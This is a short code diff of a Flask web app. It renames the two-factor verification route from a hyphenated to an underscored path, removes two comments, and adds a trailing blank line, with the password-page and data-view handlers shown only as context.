@@ -256,13 +256,11 @@ def login_password():
     # If GET request, just render the password page
     return render_template("vpassword.html", identifier=identifier)
 
-@app.route("/verify-2fa", methods=["GET", "POST"])
+@app.route("/verify_2fa", methods=["GET", "POST"])
 def verify_2fa():
     if request.method == "GET":
-        # Render the 2FA input page
         return render_template("v2fa.html")
 
-    # Handle POST (AJAX code submission)
     data = request.get_json(silent=True) or {}
     code = (data.get("code") or "").strip()
 
@@ -297,6 +295,7 @@ def view_data():
 
 if __name__ == '__main__': 
     app.run(debug=True)
+
 
 
 
